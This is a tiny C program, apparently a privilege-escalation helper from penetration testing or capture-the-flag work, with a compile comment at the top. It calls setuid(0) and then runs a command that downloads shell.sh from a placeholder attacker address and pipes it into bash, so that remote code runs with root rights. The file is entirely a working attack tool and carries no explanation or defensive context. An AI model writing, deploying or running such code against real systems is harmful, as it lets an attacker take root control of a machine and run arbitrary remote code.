// gcc root.c -o root
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
setuid(0);
system("curl http://REPLACE_THIS_IP/shell.sh|bash");
return 0;
}
